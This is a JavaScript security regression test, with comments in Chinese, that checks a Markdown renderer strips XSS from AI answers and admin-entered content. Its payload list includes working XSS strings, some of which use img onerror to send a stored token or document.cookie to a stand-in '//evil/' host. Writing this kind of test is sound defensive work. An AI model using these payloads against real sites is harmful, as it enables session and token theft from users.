/**
 * Markdown 渲染安全检测
 *
 * 背景：本平台有 6 处 v-html 渲染「非当前用户可控」的内容 ——
 * AI 回答（会回显用户输入）、知识库正文、算法题面（均由管理端录入）。
 * marked 默认保留原始 HTML，如果不清洗就塞进 v-html，
 * 一个 <img onerror=...> 就能读走 localStorage 里的 token 并外传；
 * AI 回答还会入库到 chat_record，历史会话重载时二次执行（存储型 XSS）。
 *
 * 这里用真实攻击载荷做回归，确保清洗层始终生效。
 *
 * 用法：node scripts/xss-check.mjs
 */
/* 必须在 import markdown.js 之前建好 DOM：DOMPurify 在初始化时就绑定 window，
   而且那是被缓存的单例，事后再补 __CSP_WINDOW__ 已经来不及 */
import { JSDOM } from 'jsdom'
const dom = new JSDOM('').window
globalThis.__CSP_WINDOW__ = dom

const { renderMd } = await import('../src/utils/markdown.js')

/* 攻击载荷：覆盖事件处理器、伪协议、变形绕过、表单劫持等几大类 */
const PAYLOADS = [
  { name: 'img onerror 外传 token', md: '<img src=x onerror="fetch(\'//evil/\'+localStorage.cv_token)">' },
  { name: 'svg onload', md: '<svg onload="alert(document.domain)"></svg>' },
  { name: 'script 标签', md: '<script>alert(1)</script>' },
  { name: 'iframe 嵌入', md: '<iframe src="//evil.com"></iframe>' },
  { name: 'javascript: 伪协议', md: '[点我](javascript:alert(1))' },
  { name: '大小写混淆的 onerror', md: '<IMG SRC=x ONERROR=alert(1)>' },
  { name: '反引号包裹的属性', md: '<img src=`x`onerror=alert(1)>' },
  { name: 'a 标签事件', md: '<a href="#" onclick="alert(1)">link</a>' },
  { name: 'form 表单劫持', md: '<form action="//evil"><input name="p"></form>' },
  { name: 'style 标签', md: '<style>body{display:none}</style>' },
  { name: 'object/data', md: '<object data="//evil/x.swf"></object>' },
  { name: 'base 劫持相对路径', md: '<base href="//evil/">' },
  { name: 'meta refresh 跳转', md: '<meta http-equiv="refresh" content="0;url=//evil">' },
  { name: '嵌套混淆', md: '<div><p><img src=x onerror=alert(1)></p></div>' },
  { name: '注释拆分绕过', md: '<img src=x on<!-- -->error=alert(1)>' },
  { name: 'AI 回显注入（真实场景）', md: '好的，这是您要的内容：\n\n<img src=x onerror="fetch(\'//evil/\'+document.cookie)">\n\n希望有帮助！' },
]

/**
 * 在真实 DOM 里做语义检查，而不是对字符串跑正则。
 * 正则会把「已被转义成纯文本的 &lt;img onerror=...&gt;」也判成危险 ——
 * 那段只是文本节点，不会被当成标签执行。真正要防的是存在于 DOM 树里的
 * 脚本执行入口：危险标签、事件处理器属性、javascript: 伪协议。
 */
const FORBID_TAGS = new Set(['script', 'iframe', 'object', 'embed', 'form', 'style', 'base', 'meta', 'input', 'button'])

function auditHtml(win, html) {
  const doc = new win.DOMParser().parseFromString('<body><div id="root">' + html + '</div></body>', 'text/html')
  const root = doc.getElementById('root')
  if (!root) return ['输出不是可解析的 HTML']
  const problems = []
  for (const el of root.querySelectorAll('*')) {
    const tag = el.tagName.toLowerCase()
    if (FORBID_TAGS.has(tag)) problems.push('存在危险标签 <' + tag + '>')
    for (const attr of el.getAttributeNames()) {
      if (/^on/i.test(attr)) problems.push('<' + tag + '> 带事件处理器属性 ' + attr)
      const val = (el.getAttribute(attr) || '').replace(/[^a-z:]/gi, '')
      if (/^(javascript|data|vbscript):/i.test(val)) problems.push('<' + tag + '> 的 ' + attr + ' 是伪协议 URL')
    }
  }
  return problems
}

let pass = 0
const fails = []

console.log('\n=== Markdown 渲染安全检测 ===\n')

for (const p of PAYLOADS) {
  let html = ''
  try {
    html = renderMd(p.md)
  } catch (e) {
    fails.push(`${p.name}：渲染抛异常 ${e.message}`)
    continue
  }
  const hit = auditHtml(dom, html)
  if (hit.length) {
    fails.push(p.name + '：' + hit.slice(0, 2).join('；') + ' → ' + html.slice(0, 100))
  } else {
    pass++
    console.log('  ✓ ' + p.name)
  }
}

/* 正常 Markdown 不能被误伤（sanitize 太狠会把代码块、表格、标题都干掉） */
const NORMAL = [
  { name: '代码块', md: '```python\nprint("hi")\n```', expect: /<pre|<code/i },
  { name: '标题', md: '# 一级标题', expect: /<h1/i },
  { name: '链接', md: '[官网](https://example.com)', expect: /<a\s[^>]*href="https:\/\/example\.com"/i },
  { name: '强调', md: '**加粗** 和 *斜体*', expect: /<strong/i },
  { name: '列表', md: '- 甲\n- 乙', expect: /<li/i },
  { name: '行内代码', md: '用 `malloc` 分配', expect: /<code/i },
  { name: '表格', md: '| a | b |\n|---|---|\n| 1 | 2 |', expect: /<table/i },
]
console.log('  --- 正常语法不应被误伤 ---')
for (const t of NORMAL) {
  let html = ''
  try { html = renderMd(t.md) } catch (e) { fails.push(`${t.name}：渲染抛异常`); continue }
  if (!t.expect.test(html)) fails.push(`${t.name}：正常语法被误杀 → ${html.slice(0, 90)}`)
  else { pass++; console.log(`  ✓ ${t.name}`) }
}

/* 边界输入不能直接崩 */
console.log('  --- 边界输入 ---')
for (const [name, v] of [['null', null], ['undefined', undefined], ['空串', ''], ['纯空白', '   '], ['数字', 123]]) {
  try {
    const r = renderMd(v)
    if (typeof r !== 'string') { fails.push(`${name}：返回值不是字符串`); continue }
    pass++
    console.log(`  ✓ ${name}`)
  } catch (e) {
    fails.push(`${name}：抛异常 ${e.message}`)
  }
}

console.log(`\n通过 ${pass} 项，失败 ${fails.length} 项`)
if (fails.length) {
  console.log('\n--- 失败 ---')
  for (const f of fails) console.log('  ✗ ' + f)
  process.exit(1)
}
console.log('Markdown 渲染安全 ✅\n')
